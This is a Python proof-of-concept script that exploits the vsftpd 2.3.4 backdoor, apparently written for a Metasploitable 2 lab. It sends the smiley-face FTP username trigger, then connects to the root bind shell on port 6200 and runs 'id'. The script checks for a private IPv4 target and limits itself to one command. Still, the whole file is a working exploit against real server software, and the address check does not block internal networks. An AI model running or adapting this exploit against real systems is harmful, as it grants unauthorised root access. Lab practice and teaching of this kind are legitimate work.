#!/usr/bin/env python3
"""Controlled vsftpd 2.3.4 backdoor validation for an isolated Metasploitable 2 lab.

Usage:
    python3 manual_vsftpd_backdoor.py <YOUR_ISOLATED_TARGET_IP>

The script sends an FTP trigger, then attempts a single harmless 'id' command
through the historical bind shell on TCP/6200. It does NOT upload files,
establish persistence, or modify the target. Use only on a VM you own.
"""
import argparse
import ipaddress
import socket
import sys
import time


def tcp_connect(host: str, port: int, timeout: float = 3.0) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    return sock


def receive(sock: socket.socket) -> str:
    try:
        return sock.recv(4096).decode("utf-8", errors="replace").strip()
    except socket.timeout:
        return "(no response before timeout)"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="IPv4 address of your isolated Metasploitable 2 VM")
    args = parser.parse_args()

    try:
        ip = ipaddress.ip_address(args.target)
        if ip.version != 4 or not ip.is_private or ip.is_loopback or ip.is_link_local:
            parser.error("Use a private, non-loopback, non-link-local IPv4 lab address only.")
    except ValueError:
        parser.error("Target must be a valid private IPv4 address.")

    host = str(ip)
    print(f"[+] Authorized isolated target: {host}")

    # Detect stale bind shells from previous lab attempts before sending a new trigger.
    try:
        with tcp_connect(host, 6200, timeout=1.0):
            print("[!] Port 6200 is already open. Reset the target VM before a fresh test.")
            return 2
    except OSError:
        print("[+] Port 6200 not open before the attempt")

    try:
        with tcp_connect(host, 21) as ftp:
            banner = receive(ftp)
            print(f"[+] FTP banner: {banner}")
            if "vsftpd 2.3.4" not in banner.lower():
                print("[!] Banner does not show vsftpd 2.3.4; stopping for review.")
                return 3

            ftp.sendall(b"USER lab:)\r\n")
            print(f"[+] USER response: {receive(ftp)}")
            try:
                ftp.sendall(b"PASS test\r\n")
                print(f"[+] PASS response: {receive(ftp)}")
            except OSError:
                print("[i] FTP server closed the connection after the trigger")
    except OSError as exc:
        print(f"[-] FTP connection/trigger failed: {exc}")
        return 1

    time.sleep(0.5)
    try:
        with tcp_connect(host, 6200) as shell:
            shell.sendall(b"id\n")
            output = receive(shell)
            print(f"[+] Shell output for id: {output}")
            if "uid=0(" in output:
                print("[+] Root-level command execution demonstrated in this lab.")
                return 0
            print("[!] Listener responded, but root privileges were not confirmed.")
            return 4
    except OSError as exc:
        print(f"[-] No shell could be reached on TCP 6200: {exc}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
